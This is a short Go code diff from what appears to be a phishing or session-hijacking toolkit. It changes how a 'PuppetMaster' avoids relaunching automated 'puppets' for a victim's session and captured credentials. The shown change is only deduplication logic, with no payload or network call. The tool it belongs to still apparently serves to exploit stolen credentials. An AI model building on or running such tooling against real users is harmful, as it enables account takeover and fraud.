@@ -112,8 +112,16 @@ func (pm *PuppetMaster) LaunchPuppetForSession(victimSessionID string, credentia
 
 	// Check if already running for this session
 	if session, exists := pm.activeSessions[victimSessionID]; exists {
-		if session.Status == "solving" || session.Status == "initializing" {
-			return victimSessionID, fmt.Errorf("puppet already running for session %s", victimSessionID)
+		// Only check if it's the same trigger
+		if session.TriggerId == trigger.Id {
+			if session.Status == "solving" || session.Status == "initializing" {
+				return victimSessionID, fmt.Errorf("puppet already running for session %s", victimSessionID)
+			}
+			// If already successfully completed, don't run again
+			if session.Status == "completed" {
+				log.Debug("[PUPPET] Session %s already completed for trigger %s, skipping re-launch", victimSessionID, trigger.Id)
+				return session.Id, nil
+			}
 		}
 	}
 
